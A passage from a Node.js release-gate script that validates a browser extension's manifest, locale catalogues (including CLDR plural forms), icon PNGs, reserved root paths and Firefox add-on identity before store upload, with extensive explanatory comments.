      'the manifest grants ' + show + ' and tool.json has no\n' +
      'policy.broadHostJustification. A static host permission is granted at INSTALL, silently, for\n' +
      'every matching site — it is the single biggest driver of slow review and of install-page\n' +
      'warnings. optional_host_permissions asks at the moment of use instead, and the user can revoke it.');
  }
}

/* ---------------- 5. store limits ---------------- */
/* Measured on what a USER SEES. name/short_name/description are almost always
   __MSG_ placeholders, and the length of the literal "__MSG_appDescription__"
   is a fact about nothing. Every locale on disk is checked, because the store
   enforces the limit per locale and a translation is where 132 gets exceeded —
   FullShot's own 137-character description finding is why this exists. */
{
  const LIMITS = [
    { key: 'name', max: 45 },
    { key: 'short_name', max: 12 },
    { key: 'description', max: 132 }
  ];
  /* short_name is genuinely optional — Chrome derives it from name. name and
     description are not, and `if (typeof rawVal !== 'string') continue` made
     ABSENCE indistinguishable from COMPLIANCE: measured, a manifest with all
     three keys deleted printed PASS "name/short_name/description within store
     limits" at exit 0. Checked once, above the per-locale loop, because "the
     manifest has no name" is a fact about the manifest and printing it 55 times
     is not more true. */
  const REQUIRED = ['name', 'description'];
  if (mf.manifest_version !== 3) {
    r.fail('manifest_version is 3',
      'found ' + JSON.stringify(mf.manifest_version) + '. Chrome stopped accepting MV2 uploads; MV3 is the only option.');
  } else r.pass('manifest_version is 3');

  const vp = versionProblem(mf.version);
  if (vp) r.fail('manifest version format', 'version is ' + vp);
  else r.pass('version "' + mf.version + '" is a legal extension version');

  const locales = localesOnDisk.map(f => f.split('/')[1]);
  const scopes = locales.length ? locales : ['(no _locales — literal strings)'];
  const problems = [];
  for (const key of REQUIRED) {
    if (typeof mf[key] !== 'string' || !mf[key].trim()) {
      problems.push('manifest: "' + key + '" is ' + (key in mf ? JSON.stringify(mf[key]) : 'absent') +
        ' — ' + tool.rel + '/' + tool.manifestRel);
    }
  }
  for (const loc of scopes) {
    let messages = null;
    if (locales.length) {
      const p = readJson(path.join(tool.dirAbs, '_locales', loc, 'messages.json'));
      /* A catalogue that parses is not a catalogue that is usable: `null`, `[]`
         and `"x"` all parse, after which resolveMessages silently resolves
         nothing and this gate degrades to measuring the literal "__MSG_..."
         placeholder — which is how a broken catalogue used to be reported as
         "short_name is 20 characters, the limit is 12". */
      if (p.error || p.value === null || typeof p.value !== 'object' || Array.isArray(p.value)) {
        problems.push(loc + ': ' + (p.error || '_locales/' + loc + '/messages.json is not a JSON object of messages'));
        continue;
      }
      messages = p.value;
    }
    for (const { key, max } of LIMITS) {
      const rawVal = mf[key];
      if (typeof rawVal !== 'string') continue;
      const { text } = messages ? resolveMessages(rawVal, messages) : { text: rawVal };
      /* Count code points, not UTF-16 units: an emoji or a non-BMP character
         is one character to a store's counter and two to String.length. */
      const len = [...text].length;
      if (len === 0 && REQUIRED.includes(key)) {
        /* resolveMessages treats {"message": ""} as resolved, so a __MSG_ name
           that expands to nothing is invisible to this gate AND to gate 6. */
        problems.push(loc + ': ' + key + ' resolves to an empty string — ' + JSON.stringify(rawVal) + ' expands to nothing');
      } else if (len > max) {
        problems.push(loc + ': ' + key + ' is ' + len + ' characters, the limit is ' + max + ' — "' +
          (text.length > 80 ? text.slice(0, 77) + '...' : text) + '"');
      }
    }
  }
  if (problems.length) {
    r.fail('store metadata length limits',
      problems.join('\n') +
      '\n\nThe store rejects the upload; it does not truncate. A description over 132 characters is the\n' +
      'most common late-stage rejection there is, and it is nearly always a TRANSLATION that grew.\n' +
      'An ABSENT or empty "name" is worse than a long one: Chrome refuses to LOAD the extension\n' +
      '("Required value \'name\' is missing or invalid"). An absent "description" still loads, but it\n' +
      'leaves the store-listing summary blank and the dashboard will demand it by hand at submission.');
  } else {
    r.pass('name/short_name/description within store limits',
      locales.length ? 'checked across all ' + locales.length + ' locale(s)' : 'literal strings, no _locales');
  }
}

/* ---------------- 6. i18n integrity ---------------- */
{
  const dl = mf.default_locale;
  if (!dl && localesOnDisk.length) {
    r.fail('default_locale is declared',
      'the tree holds ' + localesOnDisk.length + ' locale catalogue(s) but the manifest sets no default_locale.\n' +
      'The store rejects this outright: "Localization used, but default_locale wasn\'t specified".');
  } else if (dl) {
    const need = '_locales/' + dl + '/messages.json';
    /* PARSED BEFORE THE VERDICT IS PRINTED. This block used to say PASS
       'default_locale "en" resolves' after testing only that the file was on
       disk and in the package — it had never been opened — and then the whole
       body below was guarded by a bare `if (p.value)` with no else. A catalogue
       containing the four characters `null` is valid JSON, so readJson returns
       {value: null} with NO error: the PASS printed, the __MSG_ gate and the
       locale-parity check silently did not run, and the tree Chrome refuses to
       load exited 0. */
    const p = readJson(path.join(tool.dirAbs, '_locales', dl, 'messages.json'));
    const catalogue = (!p.error && p.value !== null && typeof p.value === 'object' && !Array.isArray(p.value)) ? p.value : null;

    if (!localesOnDisk.includes(need)) {
      r.fail('the default locale catalogue exists',
        'manifest default_locale is "' + dl + '" but ' + tool.rel + '/' + need + ' is not on disk.\n' +
        'Chrome REFUSES TO LOAD an extension whose default catalogue is absent — this is not a\n' +
        'degraded install, it is no install.');
    } else if (!files.includes(need)) {
      r.fail('the default locale catalogue is packaged',
        need + ' exists on disk but the package rules did not collect it. The upload is rejected.');
    } else if (p.error) {
      r.fail('the default locale catalogue parses', p.error +
        '\nChrome refuses to load an extension whose default catalogue is unreadable.');
    } else if (!catalogue) {
      r.fail('the default locale catalogue is a JSON object',
        need + ' parsed as ' + (Array.isArray(p.value) ? 'an array' : p.value === null ? 'null' : typeof p.value) + '.\n' +
        'messages.json must be an object of key -> { "message": ... }. Chrome refuses to load the\n' +
        'extension, and every __MSG_ key renders as its literal placeholder.');
    } else {
      r.pass('default_locale "' + dl + '" parses with ' + Object.keys(catalogue).length + ' key(s)',
        localesOnDisk.length + ' catalogue(s) packaged');
    }

    /* Every __MSG_ key used anywhere in the packaged set must resolve in the
       default catalogue. An unresolved placeholder renders literally, as
       "__MSG_appName__", in the store listing. */
    if (catalogue) {
      const unresolved = new Map();
      const consider = [tool.manifestRel, ...files.filter(f => isHtml(f) || isJs(f) || isCss(f))];
      let scanned = 0, skipped = 0;
      for (const rel of consider) {
        if (rel.startsWith('_locales/')) { skipped++; continue; }
        const text = raw(rel);
        if (text === null) {
          /* The readability pre-pass has already FAILED by name for this file.
             Kept as a branch rather than assumed away because the two reads are
             separated in time, and "it was readable a second ago" is not a
             property of a filesystem. Never a silent continue: that swallow is
             what made an ACL-denied stylesheet score like a clean one. */
          r.fail('every packaged file in the __MSG_ scan was read', rel + ' could not be opened — see above.');
          continue;
        }
        scanned++;
        /* Comments first. A file that EXPLAINS the i18n mechanism quotes
           __MSG_ keys in prose — FullShot's pages/batch.js documents why an
           inline <style> cannot pick up __MSG_@@bidi_dir__ — and a gate that is
           red on its own documentation is a gate somebody switches off. Same
           rule as the network scan: decide on code, not on prose. */
        const scanText = isJs(rel) || isCss(rel) ? blank(text, { commentsOnly: true })
          : isHtml(rel) ? text.replace(/<!--[\s\S]*?-->/g, m => m.replace(/[^\n]/g, ' '))
            : text;
        const { missing } = resolveMessages(scanText, catalogue);
        for (const k of missing) {
          if (!unresolved.has(k)) unresolved.set(k, rel);
        }
      }
      if (unresolved.size) {
        r.fail('every __MSG_ key resolves in the default locale',
          [...unresolved].map(([k, where]) => '  __MSG_' + k + '__  first seen in ' + where).join('\n') +
          '\nMissing from _locales/' + dl + '/messages.json. An unresolved key renders as the literal\n' +
          'placeholder text — in the popup, and in the store listing.');
      } else {
        r.pass('every __MSG_ key resolves in _locales/' + dl,
          scanned + ' file(s) scanned, ' + skipped + ' locale catalogue(s) skipped');
      }

      /* Non-default locales fall back per key, so a gap degrades rather than
         breaks — a warning, not a failure. */
      const baseKeys = new Set(Object.keys(catalogue));

      /* ── 🔴 A CLDR CATEGORY A LANGUAGE DOES NOT HAVE IS NOT A MISSING KEY ──
         FIXED 2026-08-22. Until then this limb was a plain key-set diff, and on
         this tree it printed, on EVERY run:

           WARN  8 locale(s) are missing keys the default has
                 id: 9 key(s) missing (resultProgressDecodingOne, ...)

         All 72 of those findings were the same shape and none was real.
         Chrome's messages.json has no plural support — no ICU MessageFormat, no
         selector — so a sentence that agrees with a count is spelled as ONE KEY
         PER CLDR CATEGORY, chosen at runtime with Intl.PluralRules.select(n).
         Which categories a language HAS differs by language: measured here with
         Intl.PluralRules(tag).resolvedOptions().pluralCategories, `en` has
         one|other, and id/ja/ko/ms/th/vi/zh have `other` ALONE — so
         `historyCountOne` is a form those eight languages do not possess. The
         gate was demanding a key that must not exist. No amount of translation
         could ever clear it, which is the expensive part: a warning that cannot
         be cleared teaches readers that this gate's warnings are noise.

         WHERE THE CATEGORY SETS COME FROM. Intl.PluralRules — the CLDR data the
         JS engine ships — read at gate time, never a table in this file. A
         hand-written "es/fr/it take one|other" table is ALREADY wrong (current
         CLDR gives the Romance languages `many`; Hebrew has `two` and no
         `many`; Latvian has `zero`). The tool's own generator reads the same
         API, so generator and gate cannot drift apart.

         WHY THE EXEMPTION CANNOT WIDEN INTO "ANYTHING ENDING IN One".
         This gate must work for any tool, so it does NOT read the tool's
         private PLURAL_BASES declaration — it RECOVERS the plural families from
         the default catalogue, and only accepts a base whose category suffixes
         in the default locale are EXACTLY that locale's own category set. In
         `en` that means a base needs both `...One` and `...Other` and nothing
         else: `stepOne` alone is not a family ({one} ≠ {one,other}), and
         `stepOne` + `stepTwo` is not a family ({one,two} ≠ {one,other}). A key
         that merely ENDS in "One" therefore keeps being reported, which is the
         case the tool's own plurals.mjs records paying for once already
         (`historyConfirmDeleteOne` carried no count at all). Measured on this
         tree 2026-08-22: the 9 bases recovered this way are exactly the 9 the
         tool declares by hand, with zero near misses.

         FAIL TOWARD REPORTING. An unknown-but-well-formed tag does not throw —
         Intl silently answers with the engine's default locale's rules, which
         would be a wrong answer wearing a right answer's clothes. So the
         resolved language subtag is compared against the requested one, and a
         locale whose tag does not resolve to its own CLDR data is graded
         exactly as it was before this change: no exemption. */
      const CLDR_ORDER = ['zero', 'one', 'two', 'few', 'many', 'other'];
      const CLDR_SUFFIX = { zero: 'Zero', one: 'One', two: 'Two', few: 'Few', many: 'Many', other: 'Other' };
      const langOf = (t) => String(t).split('-')[0].toLowerCase();
      /* Chrome locale directories use `_` (zh_CN, pt_BR); BCP 47 uses `-`. */
      const categoriesOf = (chromeLocale) => {
        try {
          const canon = Intl.getCanonicalLocales(String(chromeLocale).replace(/_/g, '-'))[0];
          const opts = new Intl.PluralRules(canon).resolvedOptions();
          if (langOf(opts.locale) !== langOf(canon)) return null; // engine fell back
          return CLDR_ORDER.filter(c => opts.pluralCategories.includes(c));
        } catch (_) { return null; }
      };
      const splitCategory = (key) => {
        for (const [cat, suf] of Object.entries(CLDR_SUFFIX)) {
          if (key.length > suf.length && key.endsWith(suf)) return { base: key.slice(0, -suf.length), category: cat };
        }
        return null;
      };
      const defaultCats = categoriesOf(dl);
      const families = new Set();
      if (defaultCats) {
        const byBase = new Map();
        for (const k of baseKeys) {
          const sp = splitCategory(k);
          if (!sp) continue;
          if (!byBase.has(sp.base)) byBase.set(sp.base, new Set());
          byBase.get(sp.base).add(sp.category);
        }
        for (const [b, cats] of byBase) {
          if (cats.size === defaultCats.length && defaultCats.every(c => cats.has(c))) families.add(b);
        }
      }
      /* Every key a locale needs, in a stable order: the default catalogue's own
         order, then any plural form a locale may need that the default does not
         have (`ru` needs ...Few and ...Many; `en` has neither to copy). */
      const orderedKeys = [...baseKeys];
      for (const b of families) {
        for (const c of CLDR_ORDER) {
          const k = b + CLDR_SUFFIX[c];
          if (!baseKeys.has(k)) orderedKeys.push(k);
        }
      }
      const requiredFor = (locCats) => {
        if (!locCats) return new Set(baseKeys); // no CLDR data: grade as before
        const req = new Set();
        for (const k of baseKeys) {
          const sp = splitCategory(k);
          if (!sp || !families.has(sp.base)) req.add(k);
        }
        for (const b of families) for (const c of locCats) req.add(b + CLDR_SUFFIX[c]);
        return req;
      };

      const thin = [];
      const dark = [];
      let exemptKeys = 0, exemptLocales = 0;
      for (const rel of localesOnDisk) {
        const loc = rel.split('/')[1];
        if (loc === dl) continue;
        const q = readJson(path.join(tool.dirAbs, rel));
        /* The shape check is not decoration: `k in q.value` throws
           "Cannot use 'in' operator" on a catalogue containing null, which
           aborts the run with a stack trace and no report at all. */
        if (q.error || q.value === null || typeof q.value !== 'object' || Array.isArray(q.value)) {
          thin.push(loc + ': ' + (q.error || 'catalogue is not a JSON object of messages'));
          continue;
        }
        const locCats = categoriesOf(loc);
        const required = requiredFor(locCats);
        const absent = orderedKeys.filter(k => required.has(k) && !(k in q.value));
        /* Two classes, and they are NOT the same finding. A key the default has
           falls back to the default. A plural form the default does not have
           (a `few` for Russian) has nothing to fall back TO — chrome.i18n
           resolves it to the empty string, so the sentence renders blank. */
        const missing = absent.filter(k => baseKeys.has(k));
        const noSource = absent.filter(k => !baseKeys.has(k));
        if (missing.length) thin.push(loc + ': ' + missing.length + ' key(s) missing (' + missing.slice(0, 4).join(', ') + (missing.length > 4 ? ', ...' : '') + ')');
        if (noSource.length) dark.push(loc + ' [' + (locCats || []).join('|') + ']: ' + noSource.length + ' plural form(s) absent (' + noSource.slice(0, 4).join(', ') + (noSource.length > 4 ? ', ...' : '') + ')');
        const skipped = [...baseKeys].filter(k => !required.has(k) && !(k in q.value)).length;
        if (skipped) { exemptKeys += skipped; exemptLocales++; }
      }
      if (thin.length) {
        r.warn(thin.length + ' locale(s) are missing keys the default has',
          thin.join('\n') + '\nThose keys fall back to ' + dl + ', so nothing breaks — that market just reads English.');
      }
      if (dark.length) {
        r.warn(dark.length + ' locale(s) lack a plural form their language requires',
          dark.join('\n') + '\nThese are NOT in _locales/' + dl + ' either, so there is nothing to fall back to: the language\n' +
          'has a CLDR category ' + dl + ' does not, and chrome.i18n resolves the missing key to an empty string.\n' +
          'The sentence renders blank for those counts. Generate the form (see the tool\'s i18n/plurals.mjs).');
      }
      if (exemptKeys) {
        r.note('plural-aware: ' + exemptKeys + ' key(s) across ' + exemptLocales + ' locale(s) were NOT counted as missing — ' +
          'their CLDR category does not exist in that language (' + families.size + ' plural base(s) recovered from _locales/' + dl + ').');
      }
    }
  } else {
    r.pass('no localisation', 'no _locales tree and no default_locale — consistent');
  }

  /* The two independent paths to _locales must agree (see packagedFiles), and
     the two directions are NOT symmetric in consequence. */
  if (missedByRules.length) {
    r.warn('package.include no longer reaches _locales on its own',
      missedByRules.length + ' of ' + localesOnDisk.length + ' catalogue(s) are being carried ONLY by the\n' +
      'unconditional locale collector, not by package.include. The package is still correct, because the\n' +
      'collector is what ships — but the pattern language has stopped seeing them, and the next person to\n' +
      'read include/exclude will believe locales are covered there when they are not.\n' +
      'Add "_locales/" back to package.include in tool.json.');
  }
  if (missedByCollector.length) {
    r.fail('the unconditional locale collector sees every catalogue the rules do',
      missedByCollector.map(f => '  ' + f).join('\n') +
      '\nThese reach the package through package.include but NOT through localeMessageFiles(), which is\n' +
      'the list gates 5 and 6 are graded against. So they SHIP and they are never graded — the opposite\n' +
      'direction from the warning above, and not saved by the union. Measured cause: a locale directory\n' +
      'replaced by a Windows junction, which readdirSync reports as isSymbolicLink and not isDirectory.\n' +
      'The run that produced it printed "55 locale catalogue(s)" and "54 catalogue(s) packaged" in the\n' +
      'same report, and passed.');
  }
}

/* ---------------- 7. icons ---------------- */
{
  const REQUIRED = ['16', '32', '48', '128'];
  const icons = mf.icons || {};
  const problems = [];
  const PNG_SIG = Buffer.from([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]);
  /* One PNG proof, used by both the required-size loop and action.default_icon.
     They used to disagree: default_icon entries were only tested for packaged-set
     membership, so a .svg renamed to .png passed there and failed here. */
  const provePng = (label, rel, size) => {
    if (typeof rel !== 'string' || !rel) { problems.push(label + 'is not a path: ' + JSON.stringify(rel)); return; }
    if (!files.includes(rel)) { problems.push(label + rel + ' is declared but not in the packaged set'); return; }
    let buf;
    try { buf = fs.readFileSync(path.join(tool.dirAbs, rel)); }
    catch (e) { problems.push(label + 'cannot read ' + rel + ': ' + e.message); return; }
    if (buf.length < 24 || !buf.subarray(0, 8).equals(PNG_SIG)) {
      problems.push(label + rel + ' is not a PNG (wrong magic bytes) — a renamed .jpg or .svg is rejected at upload');
      return;
    }
    if (buf.subarray(12, 16).toString('ascii') !== 'IHDR') { problems.push(label + rel + ' has no IHDR chunk — the file is truncated or corrupt'); return; }
    if (size === null) return;
    const w = buf.readUInt32BE(16), h = buf.readUInt32BE(20);
    if (w !== size || h !== size) {
      problems.push(label + rel + ' is actually ' + w + 'x' + h + ' — the browser scales it, and a scaled 128 at 16px looks like a broken extension');
    }
  };
  for (const size of REQUIRED) {
    const rel = icons[size];
    if (!rel) { problems.push(size + 'px: not declared in manifest "icons"'); continue; }
    provePng(size + 'px: ', rel, Number(size));
  }
  /* action.default_icon is legal MV3 in TWO forms — a {size: path} object and a
     bare path string — and the string form fell straight past the old
     `typeof action === 'object'` test: measured, "icons/does-not-exist.png"
     printed PASS "icons 16/32/48/128 present, real PNGs, correct dimensions" at
     exit 0. An ABSENT default_icon stays legal: the browser falls back to the
     top-level "icons", which is why the test is hasOwnProperty and not truthiness. */
  if (mf.action && Object.prototype.hasOwnProperty.call(mf.action, 'default_icon')) {
    const decl = mf.action.default_icon;
    if (typeof decl === 'string') provePng('action.default_icon: ', decl, null);
    else if (decl && typeof decl === 'object' && !Array.isArray(decl)) {
      for (const [size, rel] of Object.entries(decl)) provePng('action.default_icon ' + size + 'px: ', rel, Number(size) || null);
    } else {
      problems.push('action.default_icon is ' + (decl === null ? 'null' : Array.isArray(decl) ? 'an array' : typeof decl) +
        ' — MV3 accepts a path string or a {size: path} object and nothing else. The browser ignores it and the toolbar shows the default puzzle piece.');
    }
  }
  if (problems.length) r.fail('icon set is complete and real', problems.join('\n'));
  else r.pass('icons 16/32/48/128 present, real PNGs, correct dimensions');
}

/* ---------------- 8. no underscore-prefixed root entries ---------------- */
{
  const roots = new Set(files.map(f => f.split('/')[0]));
  const bad = [...roots].filter(n => n.startsWith('_') && n !== '_locales');
  if (bad.length) {
    r.fail('no root entry starts with "_" except _locales',
      'the package would contain: ' + bad.join(', ') + '\n' +
      'Chrome refuses to load the extension outright: "Cannot load extension with file or directory\n' +
      'name _x. Filenames starting with \\"_\\" are reserved for use by the system." _locales is the\n' +
      'only permitted exception. This is exactly why the vendored core is vendor/core/ and never _core/.');
  } else {
    r.pass('no reserved underscore paths at the package root',
      roots.has('_locales') ? '_locales is the one permitted exception, and it is present' : undefined);
  }
}

/* ---------------- identity: the parts only the owner can finish ---------- */
/* THIS BLOCK USED TO HAVE THREE SILENT PATHS, AND THE LIKELIEST FAILURE TOOK
   ALL THREE. `if (fs.existsSync(idAbs))` had no else, so a tool with no
   publish/identity.json printed nothing at all; the ownerDomain test matched
   only the literal placeholder, so an ABSENT ownerDomain — which derives the
   permanent Firefox id as "<slug>@undefined" — raised nothing; and the Firefox
   overlay was only graded when targets.firefox.overlay is a string, which is
   null for both tool.json files in this repo, while
   publish/manifest.firefox.json has read "fullshot@REPLACE-WITH-YOUR-DOMAIN.example"
   next to five built -firefox.zip files the whole time. */
{
  const pubAbs = path.join(tool.dirAbs, 'publish');
  const ffOverlayRel = tool.targets && tool.targets.firefox && tool.targets.firefox.overlay;
  const ffManifestRel = 'publish/manifest.firefox.json';
  const hasFfManifest = fs.existsSync(path.join(tool.dirAbs, ffManifestRel));
  let ffZips = [];
  try { ffZips = fs.readdirSync(pubAbs).filter(n => /-firefox\.zip$/i.test(n)); }
  catch (e) { if (e.code !== 'ENOENT') r.fail('publish/ is readable', 'cannot read ' + pubAbs + ': ' + e.code + ' — ' + e.message); }
  /* Keyed on the Firefox surface AS IT EXISTS ON DISK. Not on
     targets.firefox being present (both tool.json files in this repo carry
     "firefox": { "overlay": null }, so it is always true and discriminates
     nothing) and not on status === 'shipping' (fullshot is deliberately "wip"
     and is the only tool with real Firefox zips). */
  const ffSurface = (typeof ffOverlayRel === 'string' && ffOverlayRel) || hasFfManifest || ffZips.length > 0;

  /* The id publish/identity.json IMPLIES, or null when it cannot imply one.
     Set below, consumed by the Firefox-manifest limb further down. It exists
     because identity.json and manifest.firefox.json are TWO COPIES OF ONE FACT
     for any tool without publish/bump-version.mjs to derive the second from the
     first -- and fullshot is exactly that tool. Nothing compared them until
     2026-08-18. */
  let derivedGeckoId = null;

  const idRel = 'publish/identity.json';
  const idAbs = path.join(tool.dirAbs, idRel);
  if (fs.existsSync(idAbs)) {
    const p = readJson(idAbs);
    if (p.error) r.fail('publish/identity.json parses', p.error);
    else if (p.value === null || typeof p.value !== 'object' || Array.isArray(p.value)) {
      r.fail('publish/identity.json is a JSON object',
        idRel + ' parsed as ' + (Array.isArray(p.value) ? 'an array' : p.value === null ? 'null' : typeof p.value) +
        '. Every field below reads off it, and a non-object makes them all read "absent".');
    } else {
      const id = p.value;
      if (id.slug !== tool.id) {
        r.fail('publish/identity.json slug matches the tool id',
          'identity.json says slug "' + id.slug + '", tool.json says id "' + tool.id + '".\n' +
          'The slug names the zip the tool builds and the local part of the Firefox add-on id; the tool id\n' +
          'names the git tag, the CI matrix entry and the release artifact. Two names for one tool is how a\n' +
          'release ends up with an artifact nobody can match to a tag.');
      } else r.pass('publish/identity.json slug agrees with the tool id');

      const od = typeof id.ownerDomain === 'string' ? id.ownerDomain.trim() : '';
      if (!od || /REPLACE|\.example$/i.test(od)) {
        r.owner('publish/identity.json ownerDomain is ' + (od ? 'still a placeholder ("' + od + '")' : 'missing or empty'),
          'The Firefox add-on id is derived as <slug>@<ownerDomain>, and AMO FIXES THE ADD-ON IDENTITY AT\n' +
          'FIRST SIGNING. A placeholder that ships once is not a typo you correct later — it is an add-on\n' +
          'that belongs to nobody, forever, and the only remedy is publishing a different add-on and\n' +
          'abandoning the install base. An ABSENT ownerDomain is the worse half of this: bump-version\n' +
          'stamps the literal id "' + tool.id + '@undefined", which is not a placeholder any packager\n' +
          'recognises, so nothing downstream stops it. Set a domain you control, then run:\n' +
          '  node publish/bump-version.mjs --sync   (from ' + tool.rel + ')');
      } else if (typeof id.slug === 'string' && id.slug) {
        derivedGeckoId = id.slug + '@' + od;
      }
    }
  } else if (ffSurface) {
    r.owner('publish/identity.json does not exist, and this tool has a Firefox surface',
      (typeof ffOverlayRel === 'string' && ffOverlayRel ? 'targets.firefox.overlay names ' + ffOverlayRel + '. ' : '') +
      (hasFfManifest ? ffManifestRel + ' exists. ' : '') +
      (ffZips.length ? ffZips.length + ' built -firefox.zip file(s) sit in publish/. ' : '') + '\n' +
      'identity.json is where the slug and the ownerDomain that derive the permanent AMO add-on id are\n' +
      'recorded once instead of being typed into three scripts. Without it nothing checks either.');
  } else {
    r.note('no publish/identity.json, and no Firefox surface on disk — the slug and ownerDomain checks did not apply');
  }

  /* Graded from disk, not from targets.firefox.overlay: the overlay key is null
     in this repo's two tool.json files, which silently switched this off. */
  const ffRel = (typeof ffOverlayRel === 'string' && ffOverlayRel) ? ffOverlayRel : (hasFfManifest ? ffManifestRel : null);
  if (ffRel) {
    const p = readJson(path.join(tool.dirAbs, ffRel));
    if (p.error) {
      r.fail('the Firefox manifest parses', p.error);
    } else if (p.value === null || typeof p.value !== 'object' || Array.isArray(p.value)) {
      r.fail('the Firefox manifest is a JSON object',
        ffRel + ' parsed as ' + (Array.isArray(p.value) ? 'an array' : p.value === null ? 'null' : typeof p.value) + '.');
    } else {
      const gid = (((p.value.browser_specific_settings || {}).gecko) || {}).id || '';
      if (/REPLACE|\.example$/i.test(gid) || !gid || /@(?:undefined|null)$/i.test(gid)) {
        r.owner('the Firefox add-on id is ' + (gid ? 'a placeholder ("' + gid + '")' : 'not set') + ' in ' + ffRel,
          'Permanent from the moment AMO signs it. Do not upload this package to AMO until it names a\n' +
          'domain you control.' + (ffZips.length ? '\n' + ffZips.length + ' -firefox.zip file(s) are already built in publish/ and carry it.' : ''));
      } else if (derivedGeckoId && gid !== derivedGeckoId) {
        /* TWO COPIES OF ONE FACT, AND THIS IS THE ONLY THING THAT COMPARES THEM.
           `node publish/bump-version.mjs --sync` derives the manifest from
           identity.json and refuses when they disagree -- but that script comes
           from templates/tool/ and fullshot, the one tool in this repo with a
           real Firefox surface, does not carry it. So for fullshot the sync
           check has never run, and editing either file alone was silent.
           A disagreement here is FATAL rather than an owner action: both values
           are real domains, so no placeholder test catches it, and the one that
           reaches AMO is permanent. */
        r.fail('the Firefox add-on id agrees with publish/identity.json',
          ffRel + ' carries gecko.id "' + gid + '" but ' + idRel + ' implies "' + derivedGeckoId + '".' + '\n' +
          'These are two copies of one fact. Both look real, so no placeholder check catches the\n' +
          'disagreement, and AMO fixes whichever reaches it FIRST -- permanently. Where a tool carries\n' +
          'publish/bump-version.mjs, run `node publish/bump-version.mjs --sync` from ' + tool.rel + ';\n' +
          'this tool does not, so edit ' + ffRel + ' to match ' + idRel + ' by hand, or change both.');
      } else r.pass('the Firefox add-on id is set', gid +
        (derivedGeckoId ? ' -- and agrees with ' + idRel : ''));
    }
  }

  const listings = tool.listings || {};
  const live = Object.entries(listings).filter(([, v]) => typeof v === 'string' && v);
  if (tool.status === 'shipping' && live.length === 0) {
    r.owner('tool.json status is "shipping" but no store listing URL is recorded',
      'listings.chrome / .edge / .firefox are all null. Fill them in as each listing goes live so the\n' +
      'README catalog can link to them — gen-catalog.mjs reads exactly these fields and will not guess a URL.');
  }
}

process.exit(r.finish({
  warningsAsErrors: args.bool('warnings-as-errors'),
  ownerActionsFatal: args.bool('owner-actions-fatal')
}));
